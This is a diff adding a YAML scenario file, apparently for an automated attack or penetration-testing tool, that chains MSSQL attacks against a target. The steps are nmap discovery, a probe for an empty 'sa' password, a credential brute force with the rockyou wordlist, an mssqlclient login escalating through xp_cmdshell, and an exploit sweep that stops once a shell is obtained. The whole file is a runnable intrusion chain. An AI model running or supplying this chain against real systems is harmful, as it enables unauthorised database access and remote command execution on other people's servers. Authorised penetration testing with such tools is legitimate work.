@@ -1,0 +1,56 @@
+name: apt_mssql
+description: 'MSSQL scenario chain: port and info scripts, empty-password probe, xp_cmdshell
+  escalation with creds; stops at the first SHELL.'
+enabled: true
+platforms:
+- linux
+- windows
+steps:
+- id: bind
+  phase: recon
+  run: assign target {target}
+  description: bind the box into payload params
+  timeout: 300
+- id: ports_mssql
+  phase: recon
+  run: nmap -Pn -p 1433,1434,2433 -sV --script ms-sql-info {target}
+  description: mssql service discovery and info
+  timeout: 600
+- id: mssql_empty
+  phase: enum
+  run: nmap -Pn -p 1433 --script ms-sql-empty-password --script-args mssql.instance-port=1433
+    {target}
+  description: probe the sa empty-password misconfiguration
+  timeout: 600
+  capture: mssql_empty
+  continue_on_error: true
+- id: mssql_brute
+  phase: cred
+  run: nmap -Pn -p 1433 --script ms-sql-brute --script-args userdb=/usr/share/wordlists/inner.namelist.txt,passdb=/usr/share/wordlists/rockyou.txt
+    {target}
+  description: bounded mssql credential brute
+  timeout: 900
+  capture: mssql_brute
+  continue_on_error: true
+- id: mssql_cli
+  phase: exploit
+  run: mssqlcli {target}
+  description: impacket mssqlclient with payload creds; xp_cmdshell when it lands
+  timeout: 600
+  continue_on_error: true
+- id: sweep
+  phase: exploit
+  run: atomic_exploit
+  description: yaml exploit sweep from scan triggers; stops at the first SHELL
+  timeout: 1800
+- id: session_attempt
+  phase: post_exploitation
+  run: create_session_json
+  description: record the session when a shell landed
+  timeout: 300
+  continue_on_error: true
+tags:
+- mssql
+- cve
+total_timeout: 3000
+version: 2
